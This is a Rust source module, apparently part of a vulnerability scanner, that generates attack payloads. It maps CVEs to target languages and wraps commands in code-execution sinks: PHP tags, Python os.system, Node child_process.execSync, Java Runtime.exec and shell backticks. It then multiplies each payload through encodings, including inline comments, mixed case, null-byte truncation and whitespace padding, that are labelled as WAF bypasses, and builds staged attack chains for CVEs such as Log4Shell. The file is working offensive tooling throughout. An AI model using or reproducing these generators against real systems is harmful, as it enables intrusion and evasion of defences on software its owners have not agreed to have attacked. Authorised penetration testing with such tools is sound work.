//! Automated multi-language, multi-encoding payload generator for zero-day and CVE-driven scanning.

use base64::Engine;
use serde::{Deserialize, Serialize};

/// Supported target languages/frameworks for payload generation.
#[derive(Clone, Debug, Deserialize, Eq, PartialEq, Serialize)]
pub enum TargetLang {
    PHP,
    Python,
    NodeJs,
    Java,
    Ruby,
    Go,
    Rust,
    CSharp,
    Perl,
    Lua,
    Bash,
    JSP,
    ASP,
    ASPNet,
    Django,
    Flask,
    SpringBoot,
    Laravel,
    WordPress,
    Drupal,
    Generic,
}

/// Supported encoding/obfuscation layers.
#[derive(Clone, Debug, Deserialize, Eq, PartialEq, Serialize)]
pub enum EncodingLayer {
    None,
    UrlEncode,
    UrlDoubleEncode,
    HtmlEntity,
    HtmlDecimal,
    HexEncode,
    UnicodeEscape,
    Base64,
    MixedCase,
    InlineComment,
    NullByteTruncation,
    WhitespacePadding,
}

/// Database engine for SQLi payload adaptation.
#[derive(Clone, Debug, Deserialize, Eq, PartialEq, Serialize)]
pub enum Dbms {
    MySQL,
    MSSQL,
    PostgreSQL,
    Oracle,
    SQLite,
    Redis,
    MongoDB,
    Cassandra,
    Generic,
}

/// Generated payload with metadata.
#[derive(Clone, Debug, Deserialize, Eq, PartialEq, Serialize)]
pub struct GeneratedPayload {
    pub raw: String,
    pub encoding_layers: Vec<EncodingLayer>,
    pub dbms: Dbms,
    pub technique: String,
    pub waf_bypass: bool,
    pub stage: usize,
}

/// CVE-aware payload template matching known exploit patterns.
#[derive(Clone, Debug, Deserialize, Serialize)]
pub struct CvePayloadTemplate {
    pub cve_id: String,
    pub name: String,
    pub affected_component: String,
    pub technique: String,
    pub description: String,
    pub payload_stages: Vec<Vec<String>>,
    pub target_langs: Vec<TargetLang>,
    pub severity: String,
    pub cvss_score: Option<f32>,
    pub tags: Vec<String>,
}

/// Infer likely target languages for a CVE entry from its component and attack type.
fn infer_target_langs(component: &str, attack: &str) -> Vec<TargetLang> {
    let lower = component.to_lowercase();
    let attack = attack.to_lowercase();
    if lower.contains("spring")
        || lower.contains("struts")
        || lower.contains("java")
        || lower.contains("ofbiz")
        || lower.contains("weblogic")
        || lower.contains("solr")
        || lower.contains("tomcat")
        || lower.contains("activemq")
        || lower.contains("rocketmq")
        || lower.contains("geoserver")
        || lower.contains("hugegraph")
        || lower.contains("nifi")
        || lower.contains("openmetadata")
    {
        return vec![TargetLang::Java, TargetLang::SpringBoot];
    }
    if lower.contains("php")
        || lower.contains("wordpress")
        || lower.contains("drupal")
        || lower.contains("joomla")
        || lower.contains("magento")
        || lower.contains("laravel")
        || lower.contains("symfony")
        || lower.contains("woocommerce")
        || lower.contains("duplicator")
        || lower.contains("wpforms")
        || lower.contains("forminator")
        || lower.contains("wp-rocket")
        || lower.contains("litespeed")
    {
        return vec![TargetLang::PHP];
    }
    if lower.contains("python")
        || lower.contains("django")
        || lower.contains("flask")
        || lower.contains("fastapi")
        || lower.contains("aiohttp")
        || lower.contains("airflow")
        || lower.contains("pgadmin")
        || lower.contains("jupyter")
        || lower.contains("salt")
    {
        return vec![TargetLang::Python];
    }
    if lower.contains("node")
        || lower.contains("next.js")
        || lower.contains("react")
        || lower.contains("angular")
        || lower.contains("vue")
        || lower.contains("express")
        || lower.contains("vm2")
        || lower.contains("javascript")
    {
        return vec![TargetLang::NodeJs];
    }
    if lower.contains("ruby") || lower.contains("rails") {
        return vec![TargetLang::Ruby];
    }
    if lower.contains("go") || lower.contains("golang") {
        return vec![TargetLang::Go];
    }
    if lower.contains("rust") {
        return vec![TargetLang::Rust];
    }
    if lower.contains("c#")
        || lower.contains(".net")
        || lower.contains("aspnet")
        || lower.contains("aspx")
    {
        return vec![TargetLang::CSharp];
    }
    if lower.contains("perl") {
        return vec![TargetLang::Perl];
    }
    if lower.contains("lua") || lower.contains("redis") {
        return vec![TargetLang::Lua];
    }
    if lower.contains("bash")
        || lower.contains("shell")
        || lower.contains("sudo")
        || lower.contains("linux")
        || lower.contains("git")
        || lower.contains("docker")
        || lower.contains("runc")
        || lower.contains("openssh")
    {
        return vec![TargetLang::Bash];
    }
    if attack.contains("ssti")
        || attack.contains("template")
        || attack.contains("jinja")
        || attack.contains("velocity")
        || attack.contains("freemarker")
    {
        return vec![TargetLang::Generic];
    }
    vec![TargetLang::Generic]
}

/// Convert an attack-type label into a stable technique slug.
fn normalize_technique(attack: &str) -> String {
    attack.to_lowercase().replace(' ', "_").replace('-', "_")
}

/// Returns CVE payload templates derived from the full CVE database.
pub fn get_all_cve_templates() -> Vec<CvePayloadTemplate> {
    crate::cve_db::get_cve_database()
        .into_iter()
        .map(|entry| {
            let target_langs = infer_target_langs(&entry.affected_component, &entry.attack_type);
            let technique = normalize_technique(&entry.attack_type);
            let stages = if entry.payload_examples.is_empty() {
                vec![vec!["PAYLOAD".into()]]
            } else {
                vec![entry.payload_examples]
            };
            CvePayloadTemplate {
                cve_id: entry.cve_id,
                name: entry.name,
                affected_component: entry.affected_component,
                technique,
                description: entry.description,
                payload_stages: stages,
                target_langs,
                severity: entry.severity,
                cvss_score: Some(entry.cvss_score),
                tags: entry.tags,
            }
        })
        .collect()
}

/// Looks up CVE payload templates by CVE ID.
pub fn get_cve_templates(cve_id: &str) -> Option<CvePayloadTemplate> {
    get_all_cve_templates()
        .into_iter()
        .find(|t| t.cve_id == cve_id)
}

/// Encodes a raw payload string according to a specified encoding layer.
pub fn apply_encoding(raw: &str, layer: &EncodingLayer) -> String {
    match layer {
        EncodingLayer::None => raw.to_string(),
        EncodingLayer::UrlEncode => urlencoding::encode(raw).to_string(),
        EncodingLayer::UrlDoubleEncode => {
            let first = urlencoding::encode(raw);
            urlencoding::encode(&first).to_string()
        }
        EncodingLayer::HtmlEntity => raw.chars().map(|c| format!("&#{};", c as u32)).collect(),
        EncodingLayer::HtmlDecimal => raw.chars().map(|c| format!("&#x{:x};", c as u32)).collect(),
        EncodingLayer::HexEncode => raw.chars().map(|c| format!("%{:02x}", c as u8)).collect(),
        EncodingLayer::UnicodeEscape => raw
            .chars()
            .map(|c| {
                if (c as u32) > 127 {
                    format!("\\u{:04x}", c as u32)
                } else {
                    c.to_string()
                }
            })
            .collect(),
        EncodingLayer::Base64 => base64::engine::general_purpose::STANDARD.encode(raw.as_bytes()),
        EncodingLayer::MixedCase => raw
            .chars()
            .enumerate()
            .map(|(i, c)| {
                if i % 2 == 0 {
                    c.to_uppercase().collect::<String>()
                } else {
                    c.to_lowercase().collect::<String>()
                }
            })
            .collect(),
        EncodingLayer::InlineComment => raw
            .chars()
            .map(|c| {
                if c.is_alphanumeric() {
                    c.to_string()
                } else {
                    format!("{}/**/", c)
                }
            })
            .collect(),
        EncodingLayer::NullByteTruncation => format!("{}\0", raw),
        EncodingLayer::WhitespacePadding => {
            let pads = [" ", "\t", "\r", "\n", "  ", "\t\t"];
            raw.chars()
                .map(|c| {
                    let pad = pads[(c as usize) % pads.len()];
                    format!("{}{}", pad, c)
                })
                .collect()
        }
    }
}

/// Generates all encoding variants of a raw payload.
pub fn generate_all_encodings(raw: &str) -> Vec<GeneratedPayload> {
    let layers = vec![
        EncodingLayer::None,
        EncodingLayer::UrlEncode,
        EncodingLayer::UrlDoubleEncode,
        EncodingLayer::HtmlEntity,
        EncodingLayer::HtmlDecimal,
        EncodingLayer::HexEncode,
        EncodingLayer::UnicodeEscape,
        EncodingLayer::Base64,
        EncodingLayer::MixedCase,
        EncodingLayer::InlineComment,
        EncodingLayer::NullByteTruncation,
        EncodingLayer::WhitespacePadding,
    ];

    layers
        .into_iter()
        .map(|layer| GeneratedPayload {
            raw: apply_encoding(raw, &layer),
            encoding_layers: vec![layer],
            dbms: Dbms::Generic,
            technique: "encoding".into(),
            waf_bypass: true,
            stage: 1,
        })
        .collect()
}

/// Generates cross-language variants of a payload concept.
pub fn generate_cross_language_payloads(concept: &str) -> Vec<GeneratedPayload> {
    let mut results = Vec::new();
    results.push(GeneratedPayload {
        raw: format!("<?php {} ?>", concept),
        encoding_layers: vec![EncodingLayer::None],
        dbms: Dbms::Generic,
        technique: "cross-language".into(),
        waf_bypass: false,
        stage: 1,
    });
    results.push(GeneratedPayload {
        raw: format!("__import__('os').system('{}')", concept),
        encoding_layers: vec![EncodingLayer::None],
        dbms: Dbms::Generic,
        technique: "cross-language".into(),
        waf_bypass: true,
        stage: 1,
    });
    results.push(GeneratedPayload {
        raw: format!("require('child_process').execSync('{}')", concept),
        encoding_layers: vec![EncodingLayer::None],
        dbms: Dbms::Generic,
        technique: "cross-language".into(),
        waf_bypass: true,
        stage: 1,
    });
    results.push(GeneratedPayload {
        raw: format!("Runtime.getRuntime().exec(\"{}\")", concept),
        encoding_layers: vec![EncodingLayer::None],
        dbms: Dbms::Generic,
        technique: "cross-language".into(),
        waf_bypass: true,
        stage: 1,
    });
    results.push(GeneratedPayload {
        raw: format!("system(\"{}\")", concept),
        encoding_layers: vec![EncodingLayer::None],
        dbms: Dbms::Generic,
        technique: "cross-language".into(),
        waf_bypass: true,
        stage: 1,
    });
    results.push(GeneratedPayload {
        raw: format!("`{}`", concept),
        encoding_layers: vec![EncodingLayer::None],
        dbms: Dbms::Generic,
        technique: "cross-language".into(),
        waf_bypass: false,
        stage: 1,
    });
    results
}

/// Generates WAF bypass variants of a payload.
pub fn generate_waf_bypass_variants(payload: &str) -> Vec<GeneratedPayload> {
    let mut variants = Vec::new();

    for layer in &[
        EncodingLayer::InlineComment,
        EncodingLayer::MixedCase,
        EncodingLayer::NullByteTruncation,
        EncodingLayer::WhitespacePadding,
        EncodingLayer::UrlEncode,
        EncodingLayer::UrlDoubleEncode,
        EncodingLayer::HtmlEntity,
        EncodingLayer::HexEncode,
    ] {
        variants.push(GeneratedPayload {
            raw: apply_encoding(payload, layer),
            encoding_layers: vec![layer.clone()],
            dbms: Dbms::Generic,
            technique: "waf-bypass".into(),
            waf_bypass: true,
            stage: 1,
        });
    }
    variants
}

/// Generates a full CVE-aware attack chain from a CVE template.
pub fn generate_cve_attack_chain(template: &CvePayloadTemplate) -> Vec<GeneratedPayload> {
    let mut chain = Vec::new();

    for (stage_idx, stage_payloads) in template.payload_stages.iter().enumerate() {
        for payload in stage_payloads {
            let mut encodings = generate_all_encodings(payload);
            let mut waf_bypass = generate_waf_bypass_variants(payload);
            for p in encodings.iter_mut() {
                p.stage = stage_idx + 1;
                p.technique = template.technique.clone();
            }
            for p in waf_bypass.iter_mut() {
                p.stage = stage_idx + 1;
                p.technique = format!("{}-waf-bypass", template.technique);
            }
            chain.extend(encodings);
            chain.extend(waf_bypass);
        }
    }
    chain
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_url_encoding_layer() {
        let encoded = apply_encoding("alert(1)", &EncodingLayer::UrlEncode);
        assert!(encoded.contains("%28") && encoded.contains("%29"));
    }

    #[test]
    fn test_cve_template_lookup() {
        let template = get_cve_templates("CVE-2021-41773");
        assert!(template.is_some());
        if let Some(t) = template {
            assert_eq!(t.severity, "Critical");
        }
    }

    #[test]
    fn test_cve_attack_chain() {
        let template = get_cve_templates("CVE-2021-44228");
        assert!(template.is_some());
        if let Some(t) = template {
            let chain = generate_cve_attack_chain(&t);
            assert!(chain.len() > 10);
        }
    }
}
